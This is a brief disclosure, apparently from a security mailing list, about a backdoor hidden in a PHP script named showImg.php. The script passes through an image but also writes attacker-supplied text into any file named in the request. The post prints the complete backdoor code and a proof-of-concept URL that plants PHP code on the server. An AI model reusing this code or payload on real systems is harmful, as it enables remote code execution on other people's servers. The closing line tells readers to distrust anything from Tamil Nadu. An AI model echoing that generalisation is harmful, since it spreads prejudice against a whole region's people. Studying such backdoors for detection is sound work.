showImg.php passes through img.jpg, but also runs the following code
as a trivial arbitrary file write back door.  It has nothing to do
with showing an image.

    <?php
    $reqOut="".$_GET['email'];
    $reqDB="".$_GET['db'];
    $in_fileStr = file_get_contents_me($reqDB);
    $count =substr_count($in_fileStr,$reqOut);
    if($count==0){
    $finalStr="".$in_fileStr."\n".$reqOut."#".$today = date("F j, Y, g:i a");
    $fT = @fopen($reqDB, 'wt');
    fwrite($fT, $finalStr);
    fclose($fT);
    }
    ?>

POC: showImg.php?db=me.php&email=<?echo "hello"; ?>

Moral of the story: don't trust obfuscated software from Tamil Nadu
province.  Actually, just don't trust obfuscated software, and don't
trust anything from Tamil Nadu.
